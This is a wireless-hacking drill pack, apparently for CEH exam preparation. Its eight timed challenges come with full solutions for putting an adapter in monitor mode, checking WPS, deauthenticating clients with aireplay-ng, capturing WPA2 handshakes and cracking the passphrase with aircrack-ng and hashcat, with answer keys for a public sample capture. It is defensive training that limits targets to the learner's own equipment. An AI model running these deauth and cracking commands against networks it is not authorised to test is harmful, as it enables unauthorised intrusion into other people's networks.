# Drill Pack 07 — Wireless

> ⚠️ **STOP — legality & hardware first.** Wi-Fi attacks transmit on **regulated radio spectrum** and touch other devices' traffic. Capturing handshakes, deauthenticating clients, or probing WPS against a network **you do not own or have written permission to test is a crime** almost everywhere. **Only ever target your OWN AP/router and your OWN client devices**, on a throwaway SSID you set up for this. Not a neighbour's, an employer's, a café's — ever.
>
> The live drills need a **USB Wi-Fi adapter that supports monitor mode + packet injection** (Atheros AR9271, Ralink RT3070/RT5370, Realtek RTL8812AU). A VM's virtual NIC **cannot** do this — USB-passthrough a physical adapter. **No adapter or no test AP? Every drill is still doable:** use the aircrack-ng **sample capture `wpa.cap`** (ESSID `test`, BSSID `00:14:6C:7E:40:80`, PSK **`biscotte`**) — grab it from the aircrack-ng *Cracking WPA* tutorial (see [Sources](#sources)) and follow each drill's **⚡ faster / no-adapter** note.
>
> Recipes: [`../challenge-playbooks.md`](../challenge-playbooks.md) (wireless section). Theory: [Module 16 — Hacking Wireless Networks](../../modules/16-hacking-wireless-networks/). Tool course: [`../../kali/13-wireless.md`](../../kali/13-wireless.md).

Score yourself: **✅ under target time / ⚠️ over time / ❌ needed the solution**. Set placeholders — `AA:BB:CC:DD:EE:FF` = your AP's BSSID, `6` = your channel, `wlan0` = your adapter, `11:22:33:44:55:66` = your own client's MAC. Re-drill anything not ✅.

---

### Challenge 1 — Monitor mode & scan the air ⏱️ 6 min
**Q:** Put your adapter into monitor mode and scan. What are the **BSSID, ESSID, and channel** of your own AP?
<details><summary>Solution</summary>

```bash
iwconfig                           # find the wireless interface (often wlan0)
sudo airmon-ng check kill          # stop NetworkManager/wpa_supplicant fighting for the card
sudo airmon-ng start wlan0         # -> creates wlan0mon (monitor mode)
iwconfig                           # confirm it says  Mode:Monitor
sudo airodump-ng wlan0mon          # survey ~30s, then Ctrl+C
```

**You should see** a live table; the top half lists APs. Find **yours by ESSID (name)**:
```
BSSID              PWR  CH  ENC   ESSID
AA:BB:CC:DD:EE:FF  -42   6  WPA2  HomeNet
```
**Answer** = your AP's **BSSID** (its MAC), **ESSID** (name), and **CH** — e.g. `AA:BB:CC:DD:EE:FF` / `HomeNet` / `6`. Write all three down; the next drills need them.

**⚡ faster / no-adapter:** read the same fields straight from the sample capture — `aircrack-ng wpa.cap` reports ESSID **`test`**, BSSID **`00:14:6C:7E:40:80`**, `WPA (1 handshake)`. Losing internet after `check kill` is expected; you restore it in the cleanup at the end.
</details>

### Challenge 2 — Count associated clients ⏱️ 5 min
**Q:** How many client devices are currently **associated** to your AP?
<details><summary>Solution</summary>

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# -c = your channel, --bssid = your AP only. Watch the LOWER table.
```

**You should see** the bottom (STATION) table; the BSSID column says which AP each client is on:
```
BSSID              STATION            PWR   Frames
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -48    120
AA:BB:CC:DD:EE:FF  77:88:99:AA:BB:CC  -61     30
```
**Answer** = the number of STATION rows whose BSSID equals **your** AP (here **2**). Rows with BSSID `(not associated)` are devices probing but **not** connected — don't count them.

**⚡ faster / no-adapter:** the sample cap contains **one** associated station (the client that completed the handshake). List the MACs that spoke EAPOL with `tshark -r wpa.cap -Y eapol -T fields -e wlan.sa | sort -u` (you'll see the AP and its one client).
</details>

### Challenge 3 — Is WPS enabled? ⏱️ 6 min
**Q:** Is **WPS** (Wi-Fi Protected Setup) enabled on your AP — and is it locked?
<details><summary>Solution</summary>

```bash
sudo wash -i wlan0mon        # lists ONLY WPS-capable APs it can hear
```

**You should see** a WPS-only table:
```
BSSID              Ch  dBm  WPS  Lck  ESSID
AA:BB:CC:DD:EE:FF   6  -45  2.0  No   HomeNet
```
**Answer** = if **your BSSID appears** in wash's list, WPS is **ENABLED**. Read the `Lck` column: `No` = unlocked, so an online PIN brute (`reaver`/`bully`) or Pixie-Dust could proceed; `Yes` = the AP locks WPS after failed PINs (the secure behaviour). If your AP is **absent**, WPS is disabled — the correct hardening.

**⚡ faster / no-adapter:** `wash` needs a live radio — a static `.cap` carries no WPS state. Cross-check on the router's admin page under **Wireless → WPS**; if it's on for a real router, **disable it**.
</details>

### Challenge 4 — Capture the WPA2 4-way handshake ⏱️ 10 min
**Q:** Capture a WPA2 **4-way handshake** from your own AP.
<details><summary>Solution</summary>

**Terminal 1** — lock onto your AP + channel and write the capture:
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# saves cap-01.cap; watch the TOP-RIGHT of the header
```
**Terminal 2** — nudge **your own** client to reconnect with a targeted deauth:
```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -a = AP BSSID   -c = YOUR client's MAC (from Challenge 2)   --deauth 5 = keep it small
```

**You should see** aireplay print `Sending 64 directed DeAuth ... [ACKs]`; a second later airodump's header flips to `WPA handshake: AA:BB:CC:DD:EE:FF`. `Ctrl+C` to stop.
**Answer** = the file `cap-01.cap` now holding the handshake — the artifact you crack next.

**⚡ faster / no-adapter:** skip capture and use the ready-made `wpa.cap` for the crack drills. With an adapter, `sudo wifite --kill` automates monitor→scan→deauth→capture. Always target your **own** client with `-c` and keep `--deauth` low — don't broadcast.
</details>

### Challenge 5 — Verify the handshake is complete ⏱️ 5 min
**Q:** Confirm you actually captured a **usable** handshake. How many EAPOL frames make one up?
<details><summary>Solution</summary>

```bash
aircrack-ng cap-01.cap            # quick check — look for "(1 handshake)" next to your BSSID
tshark -r cap-01.cap -Y eapol     # or inspect the EAPOL frames directly
```

**You should see** aircrack list your BSSID as `WPA (1 handshake)`, and tshark print the messages `Message 1 of 4 … 4 of 4`.
**Answer** = a complete WPA2 4-way handshake = **4 EAPOL frames**; messages **2 and 3** are the ones that actually let you crack the PSK. If aircrack shows `(0 handshakes)`, re-deauth and recapture.

**⚡ faster / no-adapter:** `aircrack-ng wpa.cap` → `test  WPA (1 handshake)` proves the sample is crackable; `tshark -r wpa.cap -Y eapol` shows its four EAPOL messages.
</details>

### Challenge 6 — Crack the PSK with aircrack-ng ⏱️ 10 min
**Q:** Crack the captured handshake on CPU with **aircrack-ng**. What is the passphrase?
<details><summary>Solution</summary>

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz    # first time only — rockyou ships compressed
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cap-01.cap
# -w = wordlist   -b = your AP's BSSID
```

**You should see** it count keys tested, then:
```
                        KEY FOUND! [ <your-passphrase> ]
```
**Answer** = the plaintext PSK in the brackets — **only if it's in the wordlist**. That's the whole lesson: WPA2-PSK strength = passphrase entropy. (Set your test SSID's password to a dictionary word so the crack finishes.)

**⚡ faster / no-adapter:** run it against the sample — `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:14:6C:7E:40:80 wpa.cap` → `KEY FOUND! [ biscotte ]`. **Exact answer for the sample: `biscotte`.**
</details>

### Challenge 7 — Crack it with hashcat `-m 22000` ⏱️ 10 min
**Q:** Crack the same handshake on GPU with **hashcat**. Which mode do you use, and what tool converts the capture first?
<details><summary>Solution</summary>

```bash
hcxpcapngtool -o hash.hc22000 cap-01.cap     # convert .cap -> hashcat 22000 format
# You should see: "written to hash.hc22000" with an EAPOL/handshake count.

hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

**You should see** the cracked line end with `:<passphrase>` and `Status: Cracked`.
**Answer** = mode **`-m 22000`** (the modern combined WPA/WPA2/PMKID mode that replaced 2500/16800), converted with **`hcxpcapngtool`**; the plaintext is the part after the final `:`.

**⚡ faster / no-adapter:** convert the sample — `hcxpcapngtool -o hash.hc22000 wpa.cap && hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt` → the cracked line ends **`:biscotte`**. Add `-r /usr/share/hashcat/rules/best64.rule` to stretch the wordlist; `hashcat -m 22000 hash.hc22000 --show` reprints an already-cracked result from the potfile.
</details>

### Challenge 8 — From a given `.cap`, recover the passphrase ⏱️ 8 min
**Q:** You're handed **`wpa.cap`** and nothing else. Recover the Wi-Fi passphrase (this mirrors the Practical's *"here is a capture — what is the Wi-Fi password?"*).
<details><summary>Solution</summary>

```bash
# 1) see what's inside
aircrack-ng wpa.cap
#    #  BSSID              ESSID  Encryption
#    1  00:14:6C:7E:40:80  test   WPA (1 handshake)

# 2) crack it (pick the network number if prompted — the one with the handshake)
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa.cap
```

**You should see:**
```
                        KEY FOUND! [ biscotte ]
```
**Answer** = **`biscotte`** (network ESSID `test`, BSSID `00:14:6C:7E:40:80`). The aircrack-ng project ships this file with its *Cracking WPA* tutorial precisely so you can drill the crack without a radio.

**⚡ faster / no-adapter:** this drill needs no adapter — it *is* the reference exercise. Same result via GPU: `hcxpcapngtool -o h.hc22000 wpa.cap && hashcat -m 22000 h.hc22000 /usr/share/wordlists/rockyou.txt` → `:biscotte`.
</details>

---

## Score yourself

| # | Challenge | Target | Score |
|---|---|---|---|
| 1 | Monitor mode & scan (BSSID/ESSID/CH) | 6 min | |
| 2 | Count associated clients | 5 min | |
| 3 | WPS enabled? (`wash`) | 6 min | |
| 4 | Capture the 4-way handshake | 10 min | |
| 5 | Verify the handshake (EAPOL ×4) | 5 min | |
| 6 | Crack the PSK — aircrack-ng | 10 min | |
| 7 | Crack it — hashcat `-m 22000` | 10 min | |
| 8 | Recover passphrase from a given `.cap` | 8 min | |

**Cleanup — get your internet back:** `sudo airmon-ng stop wlan0mon` then `sudo systemctl restart NetworkManager`.

Re-drill anything not ✅ under time, then log it in [`../../PROGRESS.md`](../../PROGRESS.md). The exam question is almost always the pcap variant (Challenge 8) — you're handed a capture and asked for the passphrase; own the whole chain and it's a 5-minute answer.

## Sources
- Aircrack-ng — https://www.aircrack-ng.org/
- Aircrack-ng — *Cracking WPA/WPA2* tutorial (sample `wpa.cap`, passphrase `biscotte`) — https://www.aircrack-ng.org/doku.php?id=cracking_wpa
- Aircrack-ng — sample `wpa.cap` (GitHub) — https://github.com/aircrack-ng/aircrack-ng/raw/master/test/wpa.cap
- Aircrack-ng — `airodump-ng` / `aireplay-ng` / `wash` docs — https://www.aircrack-ng.org/documentation.html
- Hashcat — WPA/WPA2 example hashes (mode 22000) — https://hashcat.net/wiki/doku.php?id=example_hashes
- hcxtools / `hcxpcapngtool` — https://github.com/ZerBea/hcxtools
- CEH Module 16 — Hacking Wireless Networks — [`../../modules/16-hacking-wireless-networks/`](../../modules/16-hacking-wireless-networks/)
